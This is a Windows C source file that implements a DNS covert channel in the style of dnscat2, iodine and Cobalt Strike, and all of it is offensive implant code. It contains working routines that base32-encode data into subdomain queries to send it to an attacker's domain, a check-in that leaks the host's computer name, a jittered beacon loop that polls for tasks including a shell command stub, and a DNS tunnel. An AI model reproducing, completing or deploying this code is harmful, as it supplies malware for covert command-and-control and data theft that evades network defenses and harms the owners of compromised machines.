/*
 * DNS Communication - DNS C2/Exfil
 * dnscat2, iodine, Cobalt Strike DNS patterns
 */

#include <windows.h>
#include <windns.h>

#pragma comment(lib, "dnsapi.lib")

// ============================================================================
// CONFIG
// ============================================================================

#pragma pack(push,1)
typedef struct {
    char domain[64];
    char bid[16];
    DWORD chunk;
} DNS_CFG;
#pragma pack(pop)

// ============================================================================
// BASE32 (DNS-safe encoding)
// ============================================================================

static const char b32[] = "abcdefghijklmnopqrstuvwxyz234567";

int b32_enc(BYTE* in, int inlen, char* out, int outlen)
{
    int i, j = 0, bits = 0, val = 0;

    for(i = 0; i < inlen && j < outlen - 1; ) {
        val = (val << 8) | in[i++];
        bits += 8;
        while(bits >= 5 && j < outlen - 1) {
            out[j++] = b32[(val >> (bits - 5)) & 0x1F];
            bits -= 5;
        }
    }
    if(bits > 0 && j < outlen - 1)
        out[j++] = b32[(val << (5 - bits)) & 0x1F];

    out[j] = 0;
    return j;
}

int b32_dec(char* in, BYTE* out, int outlen)
{
    int i, j = 0, bits = 0, val = 0;

    for(i = 0; in[i] && j < outlen; i++) {
        char c = in[i];
        int v;
        if(c >= 'a' && c <= 'z') v = c - 'a';
        else if(c >= 'A' && c <= 'Z') v = c - 'A';
        else if(c >= '2' && c <= '7') v = c - '2' + 26;
        else continue;

        val = (val << 5) | v;
        bits += 5;

        if(bits >= 8) {
            out[j++] = (val >> (bits - 8)) & 0xFF;
            bits -= 8;
        }
    }
    return j;
}

// ============================================================================
// DNS QUERIES
// ============================================================================

BOOL dns_txt(char* query, char* resp, int maxlen)
{
    DNS_RECORD* pR = 0;

    if(DnsQuery_A(query, 16, 0, 0, &pR, 0) != 0 || !pR)  // DNS_TYPE_TEXT=16
        return 0;

    if(pR->wType == 16 && pR->Data.TXT.dwStringCount > 0) {
        char* s = pR->Data.TXT.pStringArray[0];
        int i = 0;
        while(s[i] && i < maxlen - 1) { resp[i] = s[i]; i++; }
        resp[i] = 0;
    }

    DnsRecordListFree(pR, 1);  // DnsFreeRecordList
    return 1;
}

BOOL dns_a(char* query, DWORD* ip)
{
    DNS_RECORD* pR = 0;

    if(DnsQuery_A(query, 1, 0, 0, &pR, 0) != 0 || !pR)  // DNS_TYPE_A=1
        return 0;

    if(pR->wType == 1)
        *ip = pR->Data.A.IpAddress;

    DnsRecordListFree(pR, 1);
    return 1;
}

BOOL dns_cname(char* query, char* resp, int maxlen)
{
    DNS_RECORD* pR = 0;

    if(DnsQuery_A(query, 5, 0, 0, &pR, 0) != 0 || !pR)  // DNS_TYPE_CNAME=5
        return 0;

    if(pR->wType == 5) {
        char* s = pR->Data.CNAME.pNameHost;
        int i = 0;
        while(s[i] && i < maxlen - 1) { resp[i] = s[i]; i++; }
        resp[i] = 0;
    }

    DnsRecordListFree(pR, 1);
    return 1;
}

// ============================================================================
// DNS EXFIL
// ============================================================================

// <seq>.<b32data>.<bid>.<domain>
BOOL dns_send(DNS_CFG* cfg, BYTE* data, int len)
{
    char enc[256], qry[512];
    int off = 0, seq = 0;

    while(off < len) {
        int chunk = (len - off > cfg->chunk) ? cfg->chunk : len - off;
        b32_enc(data + off, chunk, enc, sizeof(enc));

        // Build: <seq>.<enc>.<bid>.<domain>
        char* p = qry;
        int n = seq, d = 1;
        while(n >= d * 10) d *= 10;
        while(d) { *p++ = '0' + (n / d) % 10; d /= 10; }
        if(seq == 0) *p++ = '0';
        *p++ = '.';
        for(int i = 0; enc[i]; i++) *p++ = enc[i];
        *p++ = '.';
        for(int i = 0; cfg->bid[i]; i++) *p++ = cfg->bid[i];
        *p++ = '.';
        for(int i = 0; cfg->domain[i]; i++) *p++ = cfg->domain[i];
        *p = 0;

        DWORD ip;
        if(!dns_a(qry, &ip)) return 0;

        // ACK = 127.0.0.X where X = seq
        if((ip & 0xFFFFFF00) != 0x7F000000) return 0;

        off += chunk;
        seq++;
    }
    return 1;
}

// ============================================================================
// DNS RECV
// ============================================================================

int dns_recv(DNS_CFG* cfg, BYTE* buf, int maxlen)
{
    char qry[256], resp[512];
    int off = 0, seq = 0;

    while(off < maxlen) {
        // Build: <seq>.rx.<bid>.<domain>
        char* p = qry;
        int n = seq, d = 1;
        while(n >= d * 10) d *= 10;
        while(d) { *p++ = '0' + (n / d) % 10; d /= 10; }
        if(seq == 0) *p++ = '0';
        *p++ = '.'; *p++ = 'r'; *p++ = 'x'; *p++ = '.';
        for(int i = 0; cfg->bid[i]; i++) *p++ = cfg->bid[i];
        *p++ = '.';
        for(int i = 0; cfg->domain[i]; i++) *p++ = cfg->domain[i];
        *p = 0;

        if(!dns_txt(qry, resp, sizeof(resp))) break;

        // End marker
        if(resp[0] == 'E' && resp[1] == 'N' && resp[2] == 'D') break;

        int dec = b32_dec(resp, buf + off, maxlen - off);
        off += dec;
        seq++;
    }
    return off;
}

// ============================================================================
// C2 OVER DNS
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD cmd;
    DWORD arglen;
} DNS_TASK;

typedef struct {
    DWORD status;
    DWORD datalen;
} DNS_RESULT;
#pragma pack(pop)

BOOL dns_checkin(DNS_CFG* cfg)
{
    char host[64], enc[128], qry[256];
    DWORD sz = sizeof(host);
    GetComputerNameA(host, &sz);

    b32_enc((BYTE*)host, sz, enc, sizeof(enc));

    // checkin.<enc>.<bid>.<domain>
    char* p = qry;
    char* s = "checkin.";
    while(*s) *p++ = *s++;
    for(int i = 0; enc[i]; i++) *p++ = enc[i];
    *p++ = '.';
    for(int i = 0; cfg->bid[i]; i++) *p++ = cfg->bid[i];
    *p++ = '.';
    for(int i = 0; cfg->domain[i]; i++) *p++ = cfg->domain[i];
    *p = 0;

    DWORD ip;
    return dns_a(qry, &ip);
}

BOOL dns_poll(DNS_CFG* cfg, DNS_TASK* task)
{
    static BYTE buf[4096];
    int len = dns_recv(cfg, buf, sizeof(buf));

    if(len >= sizeof(DNS_TASK)) {
        DNS_TASK* t = (DNS_TASK*)buf;
        task->cmd = t->cmd;
        task->arglen = t->arglen;
        return 1;
    }
    return 0;
}

BOOL dns_respond(DNS_CFG* cfg, DNS_RESULT* result, DWORD len)
{
    return dns_send(cfg, (BYTE*)result, len);
}

// ============================================================================
// BEACON LOOP
// ============================================================================

void dns_loop(DNS_CFG* cfg, DWORD sleep_ms)
{
    dns_checkin(cfg);

    while(1) {
        DNS_TASK task;

        if(dns_poll(cfg, &task)) {
            static BYTE rbuf[8192];
            DNS_RESULT* r = (DNS_RESULT*)rbuf;
            r->status = 0;
            r->datalen = 0;

            switch(task.cmd) {
                case 0x01:  // Exit
                    return;

                case 0x02:  // Sleep
                    // Adjust sleep
                    break;

                case 0x10:  // Shell
                    // Execute, fill r->data
                    break;
            }

            dns_respond(cfg, r, sizeof(DNS_RESULT) + r->datalen);
        }

        // Jitter
        Sleep(sleep_ms + (GetTickCount() % (sleep_ms / 4)));
    }
}

// ============================================================================
// DNS TUNNEL (iodine-style)
// ============================================================================

/*
 * Full bidirectional tunnel:
 * - Upstream: base32 in subdomain labels
 * - Downstream: TXT/NULL/CNAME records
 * - Encapsulates IP/TCP
 */

#define MAX_LABEL 63
#define MAX_NAME  253

int dns_tunnel_send(DNS_CFG* cfg, BYTE* data, int len)
{
    // Fragment into labels
    char qry[256];
    char* p = qry;
    int off = 0;

    while(off < len && p < qry + MAX_NAME - 64) {
        int chunk = (len - off > 30) ? 30 : len - off;
        int enclen = b32_enc(data + off, chunk, p, MAX_LABEL);
        p += enclen;
        *p++ = '.';
        off += chunk;
    }

    // Append domain
    for(int i = 0; cfg->domain[i]; i++) *p++ = cfg->domain[i];
    *p = 0;

    DWORD ip;
    return dns_a(qry, &ip);
}

int dns_tunnel_recv(DNS_CFG* cfg, BYTE* buf, int maxlen)
{
    char qry[256], resp[512];

    // poll.<bid>.<domain>
    char* p = qry;
    char* s = "poll.";
    while(*s) *p++ = *s++;
    for(int i = 0; cfg->bid[i]; i++) *p++ = cfg->bid[i];
    *p++ = '.';
    for(int i = 0; cfg->domain[i]; i++) *p++ = cfg->domain[i];
    *p = 0;

    if(!dns_txt(qry, resp, sizeof(resp))) return 0;

    return b32_dec(resp, buf, maxlen);
}

// ============================================================================
// A-RECORD DATA ENCODING
// ============================================================================

/*
 * Encode 4 bytes per A record response:
 * - Query: <seq>.<bid>.<domain>
 * - Response: IP = data bytes
 * - Multiple queries for longer data
 */

int dns_recv_via_a(DNS_CFG* cfg, BYTE* buf, int maxlen)
{
    char qry[256];
    int off = 0, seq = 0;

    while(off + 4 <= maxlen) {
        char* p = qry;
        int n = seq, d = 1;
        while(n >= d * 10) d *= 10;
        while(d) { *p++ = '0' + (n / d) % 10; d /= 10; }
        if(seq == 0) *p++ = '0';
        *p++ = '.';
        for(int i = 0; cfg->bid[i]; i++) *p++ = cfg->bid[i];
        *p++ = '.';
        for(int i = 0; cfg->domain[i]; i++) *p++ = cfg->domain[i];
        *p = 0;

        DWORD ip;
        if(!dns_a(qry, &ip)) break;

        // 127.0.0.0 = end marker
        if(ip == 0x7F000000) break;

        // Store bytes (network order)
        buf[off++] = (ip >> 24) & 0xFF;
        buf[off++] = (ip >> 16) & 0xFF;
        buf[off++] = (ip >> 8) & 0xFF;
        buf[off++] = ip & 0xFF;

        seq++;
    }
    return off;
}

// ============================================================================
// EOF
// ============================================================================
